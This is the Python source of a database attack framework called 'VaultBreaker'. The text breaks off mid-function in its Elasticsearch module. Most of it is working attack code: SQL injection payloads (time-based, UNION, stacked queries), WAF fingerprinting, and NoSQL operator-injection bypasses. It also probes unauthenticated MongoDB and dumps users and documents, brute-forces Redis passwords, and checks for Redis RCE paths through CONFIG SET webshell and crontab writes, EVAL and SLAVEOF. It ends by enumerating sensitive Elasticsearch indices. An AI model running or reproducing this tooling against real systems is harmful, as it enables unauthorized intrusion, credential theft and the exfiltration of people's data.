#!/usr/bin/env python3
"""
VaultBreaker — Database Offensive Framework
SQL injection exploitation, MongoDB/Redis/Elasticsearch unauthenticated access,
credential extraction, and data exfiltration across six database engines.
"""

import argparse
import base64
import csv
import io
import json
import re
import socket
import struct
import sys
import time
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Dict, List, Optional

import pyfiglet
import requests
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.text import Text

TOOL_NAME = "VaultBreaker Framework"
COMMAND = "vaultbreaker"
VERSION = "1.0.0"

console = Console()

# ─────────────────────────────────────────────────────────────
# Data classes
# ─────────────────────────────────────────────────────────────

@dataclass
class AttackResult:
    module: str
    action: str
    status: str  # ok / fail / critical
    severity: str  # info / low / medium / high / critical
    notes: str
    timestamp: str = field(default_factory=lambda: datetime.utcnow().isoformat())

    def to_dict(self) -> dict:
        return {
            "module": self.module,
            "action": self.action,
            "status": self.status,
            "severity": self.severity,
            "notes": self.notes,
            "timestamp": self.timestamp,
        }


@dataclass
class Credential:
    source: str
    username: str
    password: str
    database: str
    host: str
    port: int

    def to_dict(self) -> dict:
        return {
            "source": self.source,
            "username": self.username,
            "password": self.password,
            "database": self.database,
            "host": self.host,
            "port": self.port,
        }


@dataclass
class EngagementContext:
    targets: List[str] = field(default_factory=list)
    ports: List[int] = field(default_factory=list)
    threads: int = 10
    timeout: int = 10
    delay: float = 0.0
    results: List[AttackResult] = field(default_factory=list)
    credentials: List[Credential] = field(default_factory=list)
    output_file: Optional[str] = None
    db_type: str = "auto"

    def add_result(self, result: AttackResult):
        self.results.append(result)
        prefix_map = {
            "ok": "[bold green][OK][/bold green]",
            "fail": "[bold yellow][WARN][/bold yellow]",
            "critical": "[bold red][CRIT][/bold red]",
        }
        prefix = prefix_map.get(result.status, "[bold blue][INFO][/bold blue]")
        console.print(f"  {prefix} [{result.severity.upper()}] {result.action}: {result.notes}")

    def add_credential(self, cred: Credential):
        self.credentials.append(cred)
        console.print(
            f"  [bold magenta][CRED][/bold magenta] {cred.source} → "
            f"{cred.username}:{cred.password}@{cred.host}:{cred.port}/{cred.database}"
        )

    def export(self):
        if not self.output_file:
            return
        data = {
            "tool": TOOL_NAME,
            "version": VERSION,
            "timestamp": datetime.utcnow().isoformat(),
            "targets": self.targets,
            "results": [r.to_dict() for r in self.results],
            "credentials": [c.to_dict() for c in self.credentials],
            "summary": {
                "total": len(self.results),
                "critical": sum(1 for r in self.results if r.severity == "critical"),
                "high": sum(1 for r in self.results if r.severity == "high"),
                "medium": sum(1 for r in self.results if r.severity == "medium"),
                "low": sum(1 for r in self.results if r.severity == "low"),
                "info": sum(1 for r in self.results if r.severity == "info"),
            },
        }
        with open(self.output_file, "w") as f:
            json.dump(data, f, indent=2)
        console.print(f"\n[bold blue][INFO][/bold blue] Results written to {self.output_file}")


# ─────────────────────────────────────────────────────────────
# Utility helpers
# ─────────────────────────────────────────────────────────────

def _tcp_connect(host: str, port: int, timeout: int = 5) -> Optional[socket.socket]:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        return s
    except (socket.timeout, ConnectionRefusedError, OSError):
        return None


def _send_recv(sock: socket.socket, data: bytes, timeout: int = 5) -> bytes:
    try:
        sock.settimeout(timeout)
        sock.sendall(data)
        return sock.recv(4096)
    except (socket.timeout, ConnectionResetError, OSError):
        return b""


def _http_request(url: str, method: str = "GET", data: Any = None,
                  headers: Optional[Dict] = None, timeout: int = 10,
                  json_body: Any = None) -> Optional[requests.Response]:
    try:
        kwargs = {"timeout": timeout, "verify": False, "allow_redirects": True}
        if headers:
            kwargs["headers"] = headers
        if method.upper() == "GET":
            return requests.get(url, params=data, **kwargs)
        elif method.upper() == "POST":
            if json_body is not None:
                kwargs["json"] = json_body
            elif data is not None:
                kwargs["data"] = data
            return requests.post(url, **kwargs)
        return None
    except requests.RequestException:
        return None


# Suppress insecure request warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ─────────────────────────────────────────────────────────────
# Module 1: SQL Injection
# ─────────────────────────────────────────────────────────────

class SQLiModule:
    """SQL injection exploitation across MySQL, MSSQL, PostgreSQL, Oracle, SQLite."""

    NAME = "sqli"

    ERROR_PATTERNS = {
        "mysql": [
            r"you have an error in your sql syntax",
            r"warning.*mysql",
            r"unclosed quotation mark",
            r"mysql_fetch",
            r"mysqli_",
            r"MariaDB",
        ],
        "mssql": [
            r"microsoft ole db provider for sql server",
            r"unclosed quotation mark after the character string",
            r"mssql_query\(\)",
            r"\bODBC SQL Server Driver\b",
            r"SqlClient\.SqlException",
            r"Procedure or function .* expects parameter",
        ],
        "postgresql": [
            r"PSQLException",
            r"org\.postgresql\.util",
            r"ERROR:\s+syntax error at or near",
            r"pg_query\(\)",
            r"pg_exec\(\)",
            r"unterminated quoted string",
        ],
        "oracle": [
            r"ORA-\d{5}",
            r"oracle.*driver",
            r"quoted string not properly terminated",
            r"Oracle.*error",
        ],
        "sqlite": [
            r"SQLite\/JDBCDriver",
            r"sqlite3\.OperationalError",
            r"SQLITE_ERROR",
            r"near \".*\": syntax error",
            r"unrecognized token",
        ],
    }

    WAF_SIGNATURES = [
        "mod_security", "cloudflare", "incapsula", "sucuri", "akamai",
        "imperva", "f5 big-ip", "barracuda", "fortiweb", "wallarm",
    ]

    SQLI_PAYLOADS = ["'", '"', "')", '")', "';", "' OR '1'='1", "\" OR \"1\"=\"1"]

    TIME_PAYLOADS = {
        "mysql": ["' OR SLEEP({delay})-- -", "\" OR SLEEP({delay})-- -", "') OR SLEEP({delay})-- -"],
        "mssql": ["'; WAITFOR DELAY '0:0:{delay}'-- -", "\"; WAITFOR DELAY '0:0:{delay}'-- -"],
        "postgresql": ["'; SELECT pg_sleep({delay})-- -", "\" OR pg_sleep({delay})-- -"],
        "sqlite": ["' OR randomblob(500000000)-- -"],
    }

    def run(self, ctx: EngagementContext):
        console.print("\n[bold cyan]━━━ SQLi Module ━━━[/bold cyan]")
        for target in ctx.targets:
            target_url = target if target.startswith("http") else f"http://{target}"
            console.print(f"\n[bold blue][INFO][/bold blue] Target: {target_url}")
            self._waf_detection(ctx, target_url)
            self._error_based(ctx, target_url)
            self._time_based(ctx, target_url)
            self._boolean_based(ctx, target_url)
            self._union_based(ctx, target_url)
            self._stacked_queries(ctx, target_url)

    def _waf_detection(self, ctx: EngagementContext, url: str):
        test_payload = "' OR 1=1 UNION SELECT NULL-- -"
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if not params:
            test_url = f"{url}?id={urllib.parse.quote(test_payload)}"
        else:
            first_param = list(params.keys())[0]
            test_url = re.sub(
                f"{first_param}=[^&]*",
                f"{first_param}={urllib.parse.quote(test_payload)}",
                url,
            )
        resp = _http_request(test_url, timeout=ctx.timeout)
        if resp is None:
            ctx.add_result(AttackResult("sqli", "WAF Detection", "fail", "info",
                                        "Target unreachable"))
            return
        if resp.status_code == 403:
            waf_found = "Unknown WAF"
            headers_lower = str(resp.headers).lower()
            body_lower = resp.text.lower() if resp.text else ""
            combined = headers_lower + body_lower
            for sig in self.WAF_SIGNATURES:
                if sig in combined:
                    waf_found = sig.title()
                    break
            ctx.add_result(AttackResult("sqli", "WAF Detection", "ok", "medium",
                                        f"WAF detected: {waf_found}"))
        else:
            ctx.add_result(AttackResult("sqli", "WAF Detection", "ok", "info",
                                        "No WAF detected on obvious payload"))

    def _inject_param(self, url: str, payload: str) -> str:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if not params:
            return f"{url}?id={urllib.parse.quote(payload)}"
        first_param = list(params.keys())[0]
        original_value = params[first_param][0]
        new_query = re.sub(
            f"{re.escape(first_param)}=[^&]*",
            f"{first_param}={urllib.parse.quote(original_value + payload)}",
            parsed.query,
        )
        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    def _error_based(self, ctx: EngagementContext, url: str):
        for payload in self.SQLI_PAYLOADS:
            injected = self._inject_param(url, payload)
            resp = _http_request(injected, timeout=ctx.timeout)
            if resp is None:
                continue
            body = resp.text.lower() if resp.text else ""
            for db_type, patterns in self.ERROR_PATTERNS.items():
                for pattern in patterns:
                    if re.search(pattern, body, re.IGNORECASE):
                        ctx.add_result(AttackResult(
                            "sqli", "Error-Based Detection", "critical", "critical",
                            f"SQL error from {db_type.upper()} with payload: {payload}"
                        ))
                        return
        ctx.add_result(AttackResult("sqli", "Error-Based Detection", "fail", "info",
                                    "No error-based injection found"))

    def _time_based(self, ctx: EngagementContext, url: str):
        delay = 5
        db_engines = [ctx.db_type] if ctx.db_type != "auto" else ["mysql", "mssql", "postgresql", "sqlite"]
        for engine in db_engines:
            payloads = self.TIME_PAYLOADS.get(engine, [])
            for payload_tpl in payloads:
                payload = payload_tpl.format(delay=delay)
                injected = self._inject_param(url, payload)
                start = time.time()
                resp = _http_request(injected, timeout=ctx.timeout + delay + 5)
                elapsed = time.time() - start
                if resp is not None and elapsed >= delay - 1:
                    ctx.add_result(AttackResult(
                        "sqli", "Time-Based Blind", "critical", "critical",
                        f"{engine.upper()} time-based confirmed (delay={elapsed:.1f}s) payload: {payload}"
                    ))
                    return
        ctx.add_result(AttackResult("sqli", "Time-Based Blind", "fail", "info",
                                    "No time-based blind injection confirmed"))

    def _boolean_based(self, ctx: EngagementContext, url: str):
        true_payload = "' AND '1'='1"
        false_payload = "' AND '1'='2"
        true_url = self._inject_param(url, true_payload)
        false_url = self._inject_param(url, false_payload)
        resp_true = _http_request(true_url, timeout=ctx.timeout)
        resp_false = _http_request(false_url, timeout=ctx.timeout)
        if resp_true is None or resp_false is None:
            ctx.add_result(AttackResult("sqli", "Boolean-Based Blind", "fail", "info",
                                        "Target unreachable for boolean test"))
            return
        len_diff = abs(len(resp_true.text or "") - len(resp_false.text or ""))
        if len_diff > 50:
            ctx.add_result(AttackResult(
                "sqli", "Boolean-Based Blind", "critical", "high",
                f"Response length differential: {len_diff} chars (true={len(resp_true.text or '')}, false={len(resp_false.text or '')})"
            ))
        else:
            ctx.add_result(AttackResult("sqli", "Boolean-Based Blind", "fail", "info",
                                        f"No significant length diff ({len_diff} chars)"))

    def _union_based(self, ctx: EngagementContext, url: str):
        for num_cols in range(1, 21):
            order_payload = f"' ORDER BY {num_cols}-- -"
            injected = self._inject_param(url, order_payload)
            resp = _http_request(injected, timeout=ctx.timeout)
            if resp is None:
                continue
            body = resp.text.lower() if resp.text else ""
            error_hit = any(
                re.search(p, body, re.IGNORECASE)
                for patterns in self.ERROR_PATTERNS.values()
                for p in patterns
            )
            if error_hit:
                col_count = num_cols - 1
                if col_count > 0:
                    nulls = ",".join(["NULL"] * col_count)
                    union_payload = f"' UNION SELECT {nulls}-- -"
                    union_url = self._inject_param(url, union_payload)
                    union_resp = _http_request(union_url, timeout=ctx.timeout)
                    if union_resp and union_resp.status_code == 200:
                        version_nulls = list(["NULL"] * col_count)
                        version_nulls[0] = "@@version"
                        version_payload = f"' UNION SELECT {','.join(version_nulls)}-- -"
                        ver_url = self._inject_param(url, version_payload)
                        ver_resp = _http_request(ver_url, timeout=ctx.timeout)
                        version_str = "unknown"
                        if ver_resp and ver_resp.text:
                            ver_match = re.search(r"(\d+\.\d+\.\d+[\w\-\.]*)", ver_resp.text)
                            if ver_match:
                                version_str = ver_match.group(1)
                        ctx.add_result(AttackResult(
                            "sqli", "UNION-Based", "critical", "critical",
                            f"UNION injection confirmed: {col_count} columns, version: {version_str}"
                        ))
                    else:
                        ctx.add_result(AttackResult(
                            "sqli", "UNION-Based", "ok", "high",
                            f"Column count determined: {col_count} (UNION blocked or filtered)"
                        ))
                    return
                break
        ctx.add_result(AttackResult("sqli", "UNION-Based", "fail", "info",
                                    "Could not determine column count via ORDER BY"))

    def _stacked_queries(self, ctx: EngagementContext, url: str):
        stacked_payloads = [
            "';SELECT SLEEP(5)-- -",
            "\";SELECT SLEEP(5)-- -",
            "';WAITFOR DELAY '0:0:5'-- -",
            "';SELECT pg_sleep(5)-- -",
        ]
        for payload in stacked_payloads:
            injected = self._inject_param(url, payload)
            start = time.time()
            resp = _http_request(injected, timeout=ctx.timeout + 10)
            elapsed = time.time() - start
            if resp is not None and elapsed >= 4:
                ctx.add_result(AttackResult(
                    "sqli", "Stacked Queries", "critical", "critical",
                    f"Stacked query execution confirmed (delay={elapsed:.1f}s): {payload}"
                ))
                return
        ctx.add_result(AttackResult("sqli", "Stacked Queries", "fail", "info",
                                    "No stacked query execution detected"))


# ─────────────────────────────────────────────────────────────
# Module 2: MongoDB
# ─────────────────────────────────────────────────────────────

class MongoModule:
    """MongoDB offensive — unauthenticated access, NoSQL injection, enumeration."""

    NAME = "mongo"

    def run(self, ctx: EngagementContext):
        console.print("\n[bold cyan]━━━ MongoDB Module ━━━[/bold cyan]")
        for target in ctx.targets:
            host = target.split("://")[-1].split("/")[0].split(":")[0]
            port = 27017
            for p in ctx.ports:
                if p in (27017, 27018, 27019):
                    port = p
                    break
            console.print(f"\n[bold blue][INFO][/bold blue] Target: {host}:{port}")
            self._unauth_access(ctx, host, port)
            self._nosql_injection_http(ctx, target)

    def _unauth_access(self, ctx: EngagementContext, host: str, port: int):
        try:
            import pymongo
            client = pymongo.MongoClient(host, port, serverSelectionTimeoutMS=ctx.timeout * 1000,
                                         socketTimeoutMS=ctx.timeout * 1000)
            server_info = client.server_info()
            ctx.add_result(AttackResult(
                "mongo", "Unauthenticated Access", "critical", "critical",
                f"MongoDB {server_info.get('version', '?')} open without authentication"
            ))
            self._enumerate_databases(ctx, client, host, port)
            self._extract_server_info(ctx, client)
            self._enumerate_users(ctx, client)
            client.close()
        except pymongo.errors.ServerSelectionTimeoutError:
            ctx.add_result(AttackResult("mongo", "Unauthenticated Access", "fail", "info",
                                        f"Cannot connect to {host}:{port}"))
        except pymongo.errors.OperationFailure as e:
            if "Authentication" in str(e) or "auth" in str(e).lower():
                ctx.add_result(AttackResult("mongo", "Unauthenticated Access", "ok", "info",
                                            "Authentication is required (good)"))
            else:
                ctx.add_result(AttackResult("mongo", "Unauthenticated Access", "fail", "low",
                                            f"Connection error: {e}"))
        except ImportError:
            ctx.add_result(AttackResult("mongo", "Unauthenticated Access", "fail", "info",
                                        "pymongo not installed"))

    def _enumerate_databases(self, ctx: EngagementContext, client, host: str, port: int):
        try:
            db_names = client.list_database_names()
            ctx.add_result(AttackResult(
                "mongo", "Database Enumeration", "ok", "high",
                f"Found {len(db_names)} databases: {', '.join(db_names[:20])}"
            ))
            for db_name in db_names:
                if db_name in ("admin", "local", "config"):
                    continue
                db = client[db_name]
                try:
                    collections = db.list_collection_names()
                    ctx.add_result(AttackResult(
                        "mongo", "Collection Enumeration", "ok", "medium",
                        f"{db_name}: {len(collections)} collections — {', '.join(collections[:15])}"
                    ))
                    for coll_name in collections[:5]:
                        try:
                            sample = list(db[coll_name].find().limit(5))
                            if sample:
                                fields = list(sample[0].keys()) if sample else []
                                ctx.add_result(AttackResult(
                                    "mongo", "Document Sampling", "ok", "high",
                                    f"{db_name}.{coll_name}: {len(sample)} docs sampled, "
                                    f"fields: {', '.join(str(f) for f in fields[:10])}"
                                ))
                        except Exception:
                            pass
                except Exception:
                    pass
        except Exception as e:
            ctx.add_result(AttackResult("mongo", "Database Enumeration", "fail", "info",
                                        f"Enumeration failed: {e}"))

    def _extract_server_info(self, ctx: EngagementContext, client):
        try:
            build_info = client.admin.command("buildInfo")
            ctx.add_result(AttackResult(
                "mongo", "Server Info — buildInfo", "ok", "medium",
                f"version={build_info.get('version')}, "
                f"modules={build_info.get('modules', [])}, "
                f"openssl={build_info.get('openssl', {}).get('running', 'N/A')}"
            ))
        except Exception:
            pass
        try:
            server_status = client.admin.command("serverStatus")
            connections = server_status.get("connections", {})
            ctx.add_result(AttackResult(
                "mongo", "Server Info — serverStatus", "ok", "medium",
                f"uptime={server_status.get('uptime', '?')}s, "
                f"connections: current={connections.get('current', '?')}, "
                f"available={connections.get('available', '?')}"
            ))
        except Exception:
            pass
        try:
            host_info = client.admin.command("hostInfo")
            sys_info = host_info.get("system", {})
            os_info = host_info.get("os", {})
            ctx.add_result(AttackResult(
                "mongo", "Server Info — hostInfo", "ok", "high",
                f"hostname={sys_info.get('hostname', '?')}, "
                f"os={os_info.get('name', '?')} {os_info.get('version', '')}, "
                f"cpus={sys_info.get('numCores', '?')}, "
                f"mem={sys_info.get('memSizeMB', '?')}MB"
            ))
        except Exception:
            pass

    def _enumerate_users(self, ctx: EngagementContext, client):
        try:
            users_coll = client["admin"]["system.users"]
            users = list(users_coll.find({}, {"user": 1, "db": 1, "roles": 1}))
            if users:
                user_list = [f"{u.get('user', '?')}@{u.get('db', '?')}" for u in users[:10]]
                ctx.add_result(AttackResult(
                    "mongo", "User Enumeration", "ok", "critical",
                    f"Found {len(users)} users: {', '.join(user_list)}"
                ))
        except Exception:
            pass

    def _nosql_injection_http(self, ctx: EngagementContext, target: str):
        if not target.startswith("http"):
            return
        nosql_payloads = [
            {"username": {"$ne": ""}, "password": {"$ne": ""}},
            {"username": {"$gt": ""}, "password": {"$gt": ""}},
            {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
            {"username": {"$exists": True}, "password": {"$exists": True}},
        ]
        for payload in nosql_payloads:
            resp = _http_request(target, method="POST", json_body=payload,
                                 headers={"Content-Type": "application/json"},
                                 timeout=ctx.timeout)
            if resp and resp.status_code == 200 and len(resp.text or "") > 100:
                ctx.add_result(AttackResult(
                    "mongo", "NoSQL Injection (HTTP)", "critical", "critical",
                    f"Possible NoSQL injection bypass with operator: {list(list(payload.values())[0].keys())[0]}"
                ))
                return
        param_payloads = [
            "username[$ne]=&password[$ne]=",
            "username[$gt]=&password[$gt]=",
            "username[$regex]=.*&password[$regex]=.*",
        ]
        for payload in param_payloads:
            resp = _http_request(f"{target}?{payload}", timeout=ctx.timeout)
            if resp and resp.status_code == 200 and len(resp.text or "") > 100:
                ctx.add_result(AttackResult(
                    "mongo", "NoSQL Injection (GET params)", "critical", "critical",
                    f"Possible NoSQL injection via GET parameter operators"
                ))
                return
        ctx.add_result(AttackResult("mongo", "NoSQL Injection (HTTP)", "fail", "info",
                                    "No NoSQL injection vectors confirmed via HTTP"))


# ─────────────────────────────────────────────────────────────
# Module 3: Redis
# ─────────────────────────────────────────────────────────────

class RedisModule:
    """Redis exploitation — unauthenticated access, brute-force, RCE via CONFIG SET."""

    NAME = "redis"

    COMMON_PASSWORDS = [
        "", "redis", "password", "admin", "root", "default", "123456",
        "redis123", "pass", "test", "guest", "changeme", "letmein",
        "master", "secret", "redis_password", "redispass",
    ]

    def run(self, ctx: EngagementContext):
        console.print("\n[bold cyan]━━━ Redis Module ━━━[/bold cyan]")
        for target in ctx.targets:
            host = target.split("://")[-1].split("/")[0].split(":")[0]
            port = 6379
            for p in ctx.ports:
                if p in (6379, 6380):
                    port = p
                    break
            console.print(f"\n[bold blue][INFO][/bold blue] Target: {host}:{port}")
            authed = self._unauth_check(ctx, host, port)
            if not authed:
                authed = self._auth_bruteforce(ctx, host, port)
            if authed:
                self._server_info(ctx, host, port, authed)
                self._key_enumeration(ctx, host, port, authed)
                self._dangerous_commands(ctx, host, port, authed)
                self._rce_vectors(ctx, host, port, authed)

    def _redis_cmd(self, host: str, port: int, cmd: str, password: str = "",
                   timeout: int = 5) -> Optional[str]:
        try:
            import redis as redis_lib
            r = redis_lib.Redis(host=host, port=port, password=password or None,
                                socket_timeout=timeout, decode_responses=True)
            if cmd.upper() == "INFO":
                return r.info()
            elif cmd.upper() == "DBSIZE":
                return str(r.dbsize())
            elif cmd.upper().startswith("KEYS"):
                pattern = cmd.split(None, 1)[1] if " " in cmd else "*"
                return r.keys(pattern)
            elif cmd.upper() == "CONFIG GET *":
                return r.config_get("*")
            else:
                return r.execute_command(*cmd.split())
        except Exception:
            return None

    def _unauth_check(self, ctx: EngagementContext, host: str, port: int) -> str:
        sock = _tcp_connect(host, port, ctx.timeout)
        if not sock:
            ctx.add_result(AttackResult("redis", "Connection", "fail", "info",
                                        f"Cannot connect to {host}:{port}"))
            return ""
        resp = _send_recv(sock, b"INFO\r\n", ctx.timeout)
        sock.close()
        decoded = resp.decode("utf-8", errors="ignore")
        if "redis_version" in decoded:
            version_match = re.search(r"redis_version:(\S+)", decoded)
            version = version_match.group(1) if version_match else "unknown"
            ctx.add_result(AttackResult(
                "redis", "Unauthenticated Access", "critical", "critical",
                f"Redis {version} accessible without authentication"
            ))
            return "NO_AUTH"
        elif "NOAUTH" in decoded or "Authentication required" in decoded.lower():
            ctx.add_result(AttackResult("redis", "Unauthenticated Access", "ok", "info",
                                        "Authentication required"))
        return ""

    def _auth_bruteforce(self, ctx: EngagementContext, host: str, port: int) -> str:
        ctx.add_result(AttackResult("redis", "AUTH Brute-Force", "ok", "info",
                                    f"Testing {len(self.COMMON_PASSWORDS)} common passwords"))
        for pwd in self.COMMON_PASSWORDS:
            if not pwd:
                continue
            sock = _tcp_connect(host, port, ctx.timeout)
            if not sock:
                continue
            resp = _send_recv(sock, f"AUTH {pwd}\r\n".encode(), ctx.timeout)
            sock.close()
            decoded = resp.decode("utf-8", errors="ignore")
            if "+OK" in decoded:
                ctx.add_result(AttackResult(
                    "redis", "AUTH Brute-Force", "critical", "critical",
                    f"Password found: {pwd}"
                ))
                ctx.add_credential(Credential("redis-bruteforce", "", pwd, "", host, port))
                return pwd
        ctx.add_result(AttackResult("redis", "AUTH Brute-Force", "fail", "info",
                                    "No common passwords worked"))
        return ""

    def _server_info(self, ctx: EngagementContext, host: str, port: int, password: str):
        auth = password if password != "NO_AUTH" else ""
        try:
            import redis as redis_lib
            r = redis_lib.Redis(host=host, port=port, password=auth or None,
                                socket_timeout=ctx.timeout, decode_responses=True)
            info = r.info()
            ctx.add_result(AttackResult(
                "redis", "Server Info", "ok", "medium",
                f"version={info.get('redis_version', '?')}, "
                f"os={info.get('os', '?')}, "
                f"clients={info.get('connected_clients', '?')}, "
                f"memory={info.get('used_memory_human', '?')}, "
                f"keys={sum(info.get(f'db{i}', {}).get('keys', 0) for i in range(16))}"
            ))
            r.close()
        except ImportError:
            sock = _tcp_connect(host, port, ctx.timeout)
            if sock:
                if auth:
                    _send_recv(sock, f"AUTH {auth}\r\n".encode(), ctx.timeout)
                resp = _send_recv(sock, b"INFO\r\n", ctx.timeout)
                sock.close()
                if resp:
                    ctx.add_result(AttackResult("redis", "Server Info", "ok", "medium",
                                                f"Raw INFO received ({len(resp)} bytes)"))

    def _key_enumeration(self, ctx: EngagementContext, host: str, port: int, password: str):
        auth = password if password != "NO_AUTH" else ""
        try:
            import redis as redis_lib
            r = redis_lib.Redis(host=host, port=port, password=auth or None,
                                socket_timeout=ctx.timeout, decode_responses=True)
            keys = []
            cursor = 0
            while True:
                cursor, batch = r.scan(cursor=cursor, count=100)
                keys.extend(batch)
                if cursor == 0 or len(keys) >= 500:
                    break
            if keys:
                ctx.add_result(AttackResult(
                    "redis", "Key Enumeration", "ok", "high",
                    f"Found {len(keys)} keys (sample): {', '.join(keys[:20])}"
                ))
                for key in keys[:10]:
                    try:
                        key_type = r.type(key)
                        if key_type == "string":
                            val = r.get(key)
                            preview = str(val)[:100] if val else ""
                            ctx.add_result(AttackResult(
                                "redis", "Key Value Sample", "ok", "medium",
                                f"{key} [string] = {preview}"
                            ))
                        elif key_type == "hash":
                            val = r.hgetall(key)
                            ctx.add_result(AttackResult(
                                "redis", "Key Value Sample", "ok", "medium",
                                f"{key} [hash] fields={list(val.keys())[:10]}"
                            ))
                        elif key_type == "list":
                            length = r.llen(key)
                            ctx.add_result(AttackResult(
                                "redis", "Key Value Sample", "ok", "medium",
                                f"{key} [list] length={length}"
                            ))
                        elif key_type == "set":
                            members = r.smembers(key)
                            ctx.add_result(AttackResult(
                                "redis", "Key Value Sample", "ok", "medium",
                                f"{key} [set] members={len(members)}"
                            ))
                    except Exception:
                        pass
            else:
                ctx.add_result(AttackResult("redis", "Key Enumeration", "ok", "info",
                                            "No keys found in default database"))
            r.close()
        except ImportError:
            ctx.add_result(AttackResult("redis", "Key Enumeration", "fail", "info",
                                        "redis library not installed for enumeration"))

    def _dangerous_commands(self, ctx: EngagementContext, host: str, port: int, password: str):
        auth = password if password != "NO_AUTH" else ""
        dangerous = ["CONFIG", "DEBUG", "EVAL", "SCRIPT", "SLAVEOF", "REPLICAOF", "MODULE"]
        available = []
        sock = _tcp_connect(host, port, ctx.timeout)
        if not sock:
            return
        if auth:
            _send_recv(sock, f"AUTH {auth}\r\n".encode(), ctx.timeout)
        for cmd in dangerous:
            resp = _send_recv(sock, f"COMMAND INFO {cmd}\r\n".encode(), ctx.timeout)
            decoded = resp.decode("utf-8", errors="ignore")
            if "ERR" not in decoded and "unknown" not in decoded.lower():
                available.append(cmd)
        sock.close()
        if available:
            ctx.add_result(AttackResult(
                "redis", "Dangerous Commands", "critical", "high",
                f"Available dangerous commands: {', '.join(available)}"
            ))
        else:
            ctx.add_result(AttackResult("redis", "Dangerous Commands", "ok", "info",
                                        "Dangerous commands appear restricted"))

    def _rce_vectors(self, ctx: EngagementContext, host: str, port: int, password: str):
        auth = password if password != "NO_AUTH" else ""
        vectors = []
        sock = _tcp_connect(host, port, ctx.timeout)
        if not sock:
            return
        if auth:
            _send_recv(sock, f"AUTH {auth}\r\n".encode(), ctx.timeout)
        # Check CONFIG SET capability
        resp = _send_recv(sock, b"CONFIG GET dir\r\n", ctx.timeout)
        decoded = resp.decode("utf-8", errors="ignore")
        if "dir" in decoded.lower() and "ERR" not in decoded:
            vectors.append("CONFIG SET (crontab/SSH key/webshell write)")
        # Check EVAL (Lua)
        resp = _send_recv(sock, b'EVAL "return 1+1" 0\r\n', ctx.timeout)
        decoded = resp.decode("utf-8", errors="ignore")
        if ":2" in decoded or "2" in decoded:
            vectors.append("EVAL (Lua script execution)")
        # Check SLAVEOF
        resp = _send_recv(sock, b"COMMAND INFO SLAVEOF\r\n", ctx.timeout)
        decoded = resp.decode("utf-8", errors="ignore")
        if "ERR" not in decoded:
            vectors.append("SLAVEOF (replication attack)")
        sock.close()
        if vectors:
            ctx.add_result(AttackResult(
                "redis", "RCE Vectors", "critical", "critical",
                f"Available RCE paths: {'; '.join(vectors)}"
            ))
        else:
            ctx.add_result(AttackResult("redis", "RCE Vectors", "ok", "info",
                                        "No obvious RCE vectors available"))


# ─────────────────────────────────────────────────────────────
# Module 4: Elasticsearch
# ─────────────────────────────────────────────────────────────

class ElasticModule:
    """Elasticsearch exploitation — unauthenticated access, index enumeration, data sampling."""

    NAME = "elastic"

    SENSITIVE_INDEX_KEYWORDS = [
        "user", "customer", "payment", "credential", "password", "session",
        "token", "log", "audit", "secret", "admin", "account", "auth",
        "credit", "ssn", "email", "private", "key", "cert", "config",
    ]

    def run(self, ctx: EngagementContext):
        console.print("\n[bold cyan]━━━ Elasticsearch Module ━━━[/bold cyan]")
        for target in ctx.targets:
            host = target.split("://")[-1].split("/")[0].split(":")[0]
            port = 9200
            for p in ctx.ports:
                if p in (9200, 9201, 9300):
                    port = p
                    break
            base = f"http://{host}:{port}"
            console.print(f"\n[bold blue][INFO][/bold blue] Target: {base}")
            if self._unauth_check(ctx, base):
                self._cluster_info(ctx, base)
                self._index_enumeration(ctx, base)
                self._kibana_detection(ctx, host)
                self._snapshot_repos(ctx, base)
                self._security_plugins(ctx, base)

    def _unauth_check(self, ctx: EngagementContext, base: str) -> bool:
        resp = _http_request(f"{base}/", timeout=ctx.timeout)
        if resp is None:
            ctx.add_result(AttackResult("elastic", "Connection", "fail", "info",
                                        f"Cannot connect to {base}"))
            return False
        if resp.status_code == 401:
            ctx.add_result(AttackResult("elastic", "Unauthenticated Access", "ok", "info",
                                        "Authentication required (HTTP 401)"))
            return False
        try:
            data = resp.json()
            cluster_name = data.get("cluster_name", "unknown")
            version = data.get("version", {}).get("number", "unknown")
            tagline = data.get("tagline", "")
            ctx.add_result(AttackResult(
                "elastic", "Unauthenticated Access", "critical", "critical",
                f"Elasticsearch {version} open — cluster: {cluster_name}, tagline: {tagline}"
            ))
            return True
        except (ValueError, KeyError):
            if resp.status_code == 200:
                ctx.add_result(AttackResult("elastic", "Unauthenticated Access", "ok", "medium",
                                            "Port open but non-standard response"))
                return True
        return False

    def _cluster_info(self, ctx: EngagementContext, base: str):
        resp = _http_request(f"{base}/_cluster/health", timeout=ctx.timeout)
        if resp and resp.status_code == 200:
            try:
                health = resp.json()
                ctx.add_result(AttackResult(
                    "elastic", "Cluster Health", "ok", "medium",
                    f"status={health.get('status')}, nodes={health.get('number_of_nodes')}, "
                    f"indices={health.get('active_primary_shards')}, "
                    f"unassigned={health.get('unassigned_shards')}"
                ))
            except ValueError:
                pass
        resp = _http_request(f"{base}/_nodes", timeout=ctx.timeout)
        if resp and resp.status_code == 200:
            try:
                nodes = resp.json()
                node_list = nodes.get("nodes", {})
                for nid, ninfo in list(node_list.items())[:5]:
                    ctx.add_result(AttackResult(
                        "elastic", "Node Info", "ok", "high",
                        f"node={ninfo.get('name', '?')}, ip={ninfo.get('ip', '?')}, "
                        f"version={ninfo.get('version', '?')}, "
                        f"os={ninfo.get('os', {}).get('pretty_name', '?')}, "
                        f"jvm={ninfo.get('jvm', {}).get('version', '?')}"
                    ))
            except ValueError:
                pass

    def _index_enumeration(self, ctx: EngagementContext, base: str):
        resp = _http_request(f"{base}/_cat/indices?v&format=json", timeout=ctx.timeout)
        if not resp or resp.status_code != 200:
            return
        try:
            indices = resp.json()
        except ValueError:
            return
        ctx.add_result(AttackResult(
            "elastic", "Index Enumeration", "ok", "high",
            f"Found {len(indices)} indices"
        ))
        sensitive_indices = []
        for idx in indices:
            idx_name = idx.get("index", "")
